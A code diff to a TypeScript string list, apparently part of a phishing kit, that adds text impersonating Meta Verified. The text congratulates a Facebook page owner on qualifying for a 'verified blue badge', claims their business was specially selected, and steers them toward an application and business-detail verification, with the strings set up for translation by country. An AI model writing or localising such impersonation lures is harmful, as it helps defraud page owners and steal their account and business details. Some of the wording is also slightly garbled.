@@ -18,7 +18,8 @@ const countryToLanguage: Record<string, string> = {
 
 const textsToTranslate = [
     'Show the world that you mean business.',
-    'Organizations can leverage the requirements to upgrade your page to a Sub-business status with a branded, relationship that reflects your brand values to drive more meaningful engagement and future.',
+    'Congratulations on achieving the requirements to upgrade your page to a verified blue badge! This is a fantastic milestone that reflects your dedication and the trust you\'ve built with your audience.',
+    'We\'re thrilled to celebrate this moment with you and look forward to seeing your page thrive with this prestigious recognition!',
     'Subscribe on Facebook',
     'A creator toolkit to take your brand further',
     'Explore key Meta Verified benefits available for Facebook and Instagram. Sub-creator plans and pricing for additional benefits.',
@@ -33,7 +34,7 @@ const textsToTranslate = [
     'Upgraded profile features',
     'Enrich your profile by adding images to your links to help boost engagement. Benefit not yet available in all regions.',
     'Sign up for Meta Verified.',
-    'Our verification process is designed to maintain the integrity of the verified badge. Let\'s start by confirming your identity.',
+    'Our verification process is designed to maintain the integrity of the verified badge. Let\'s start by confirming our invitation.',
     'Start your application',
     'Those interested in applying for Meta Verified will need to register and meet certain eligibility requirements (requirements for facebook). We are pleased to see that your business is one of the few that we have considered and selected',
     'Verify business details',
